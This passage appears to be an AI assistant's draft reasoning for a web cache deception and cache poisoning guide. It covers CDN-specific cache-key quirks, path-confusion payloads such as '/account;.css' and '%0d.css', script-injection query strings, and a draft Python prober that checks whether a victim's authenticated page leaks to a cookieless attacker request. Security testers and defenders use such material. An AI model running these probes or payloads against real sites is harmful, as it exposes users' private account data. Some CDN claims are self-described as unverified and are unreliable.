- Duplicate param: `GET /search?q=safe&q=<script>` where origin takes last, and cache... cache key is same for both so both are keyed; cloaking works when cache strips tracking params (some CDNs strip `utm_*` from cache key) — then `?utm_source=x&callback=evil` cached under `/`... Better example: Cloudflare does not strip param by default. Akamai with query-string-excluded config → `?x=evil` cached under path only.

Also `;` as param separator: origin (Tomcat/Spring) may split on `;`? matrix params.

Also `%3b`.

OK. Also mention "cache poisoning via Cookie not in key" — some CDNs don't key on cookies → `Cookie: lang=evil` reflected.

Also "cache poisoning via Host header when CDN doesn't key on Host" — rare.

Cache key injection via `Vary` — if origin reflects `Vary` header, attacker can cause vary-based cache confusion.

Let me include detection headers table.

Now CDN quirks table:

| CDN | Cache status header | Default key includes query? | Key includes headers? | Notable |
| Cloudflare | `CF-Cache-Status` | yes (full query) | no (unless Cache Rules custom key) | Cache Deception Armor; caches by extension; `Cache Everything` rule needed for HTML |
| CloudFront | `X-Cache: Hit from cloudfront` | `CachingOptimized` = NO | no | query string unkeyed by default → poisoning & deception easy |
| Fastly | `X-Cache`, `X-Served-By`, `Age` | yes | only via `Vary` | VCL `set req.http.X-...`; `Vary` respected |
| Akamai | `X-Cache`, `X-Cache-Key`, `X-Akamai-Request-ID` | configurable, often NO (`include-query-string`) | via `Cache ID` | `Pragma: akamai-x-cache-on` debug; path normalization collapses `//` and dot segments |

I'll add detail bullets.

Also: Cloudflare `CF-Cache-Status: DYNAMIC` means not cached. To force caching of HTML you need a Cache Rule with "Cache eligibility: Eligible for cache" and "Edge TTL".

Cloudflare cache deception: the `Origin` must not send `Set-Cookie` for the cached variant; Cloudflare's Cache Deception Armor (zone setting) prevents caching when extension doesn't match content type.

CloudFront: `X-Cache: Hit from cloudfront`, `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`, `Age`. To poison: pick any header in the origin request policy but not the cache policy. With `CachingOptimized` (cache policy) + `AllViewer` (origin request policy) — all headers forwarded but none keyed → any reflected header poisons. That's a very common misconfig.

Fastly: `X-Cache: HIT/MISS`, `X-Served-By`, `X-Timer`, `Fastly-Debug-Path`. `Vary` respected; if origin sends `Vary: Accept-Encoding` typical. Query string is keyed. Fat GET: Fastly may not cache GET with body.

Akamai: `X-Cache: TCP_HIT`, `X-Cache-Key`, `X-Check-Cacheable: YES`, `X-Akamai-Transformed`. Debug `Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-feo-trace`. Akamai `X-Akamai-Request-ID`.

Also mention `X-Cache-Key` lets you observe key directly — golden for parameter cloaking testing.

Also: `Vary: X-Forwarded-Host` absent → unkeyed.

Alright, also include a fuzz wordlist block.

Let me write the harness script:

```python
#!/usr/bin/env python3
"""Web cache deception prober."""
import argparse, requests, sys

VARIANTS = [...]
```

Use `requests` with `stream=False`. Compare `len` and marker.

I'll write it carefully.

Also poisoning prober: send header, check reflection in body, then re-request without header and check if reflected value persists in body + cache HIT.

Let me write both in one script with subcommands.

Keep it compiling mentally.

```python
#!/usr/bin/env python3
import argparse, sys, time
import requests

def cache_status(r):
    for h in ("CF-Cache-Status","X-Cache","X-Cache-Status","X-Proxy-Cache","X-Served-By","Age"):
        if h in r.headers:
            return f"{h}: {r.headers[h]}"
    return "no cache header"
```

Deception probe:

```python
def deception(args):
    s = requests.Session()
    s.headers["Cookie"] = args.cookie
    marker = args.marker
    for v in variants(args.path):
        try:
            r1 = s.get(args.base + v, allow_redirects=False, timeout=10)
        except requests.RequestException as e:
            print(f"[-] {v}: {e}"); continue
        if marker not in r1.text:
            print(f"[ ] {v}: no marker (status {r1.status_code})")
            continue
        # attacker request, no cookie
        time.sleep(args.delay)
        r2 = requests.get(args.base + v, allow_redirects=False, timeout=10)
        hit = marker in r2.text
        print(f"[{'!!' if hit else '  '}] {v}: status={r1.status_code} len={len(r1.text)} | attacker len={len(r2.text)} marker={hit} | {cache_status(r2)}")
```

Variants generator:

```python
EXTS = ["css","js","jpg","png","svg","ico","woff","json","txt","html"]
def variants(path):
    out = []
    for e in EXTS:
        out += [
            f"{path}/x.{e}",
            f"{path}/..%2fx.{e}",
            f"{path};.css",
            f"{path}%0d.css",
            f"{path}%0a.css",
            f"{path}%00.css",
            f"{path}%20.css",
            f"{path}%23.css",
            f"{path}%3f.css",
            f"{path}.css",
            f"{path}/x.{e}?",
        ]
    return out
```

Careful with the `;.css` etc.

Poisoning probe with headers list.

OK. Also add a raw `curl` one-liner set.

I'll also mention the pre-condition checklist: response cacheable (200, Cache-Control public, no Set-Cookie, no Vary: Cookie), extension matches cache rule, attacker can reach cached object.

Also timing: cache TTL and "victim must be first to request after cache miss" — use cache-buster to force fresh key while priming? For deception, you cannot use a cache buster because attacker needs same key. So attacker primes to a MISS right before sending victim link, or wait for TTL expiry. Actually in deception the attacker wants the victim's authenticated response cached. The attacker can send a request without cookies first to get the cache to store a MISS entry (unauthenticated), then send the victim the link — but if entry is already cached (unauthenticated version), victim gets the cached public version and no private data is cached. So attacker must ensure MISS at the moment of victim's request — e.g., use a unique path per victim (random filename) so it's always a fresh key → MISS → caches victim's private response. That's the standard `nonexistent` trick. Good point to state.

So: use random non-existent path each attempt.

Let me write that in the notes.

Now write out final answer. Dense, code-first.

I'll keep prose minimal but include the required mechanics.

Length: substantial but organized.

One more: "path confusion to leak account pages (/account.css, /account%0d.css)". Include `%0d` explanation: origin (e.g., some frameworks) strips CR/LF and normalizes path, cache uses raw URI and sees `.css`. Also `%00` null truncation in older backends.

Also Spring/Tomcat matrix params `;`: `/account;.css` — Tomcat strips `;jsessionid` style matrix params for servlet mapping → `/account`, cache sees `.css`.

Also nginx `merge_slashes`, `try_files`.

Also `..;/` for Tomcat.

Also double-encoding `%252e`.

Write it.

For CloudFront "CachingOptimized ignores query strings" — I'm fairly confident this managed policy has "Query strings: None". Yes, AWS managed `CachingOptimized` = TTL 1 day, query strings none, headers none, cookies none, gzip on. Correct.

CloudFront `CachingOptimizedForUncompressedObjects` similar. So parameter cloaking → `/api/x?a=1` and `/api/x?b=evil` share entry.

Akamai: default "Cache HTTP responses" with query string included? Many Akamai configs exclude query string for static content. I'll phrase "verify — `include-query-string` is opt-in in many configs."

Fastly: default Varnish key includes query string. Yes.

Cloudflare: default cache includes full query string. Yes.

Also mention Cloudflare "Cache Rules → Cache key → Custom cache key" with header/cookie components; misconfigurations where `X-Forwarded-Host` becomes keyed but `X-Host` isn't.

Good. Write.

I also want to include a compact "which one do I use" decision.

- Cache deception: victim-authenticated data, GET, no server-side reflection needed, requires the victim to click.
- Cache poisoning: pre-auth mass impact, requires unkeyed input reflected in a cacheable response.

Alright.

Let me also give the "Vary" bypass note: if origin sends `Vary: Cookie`, shared caching of authenticated responses typically won't happen — check.

Now writing final.
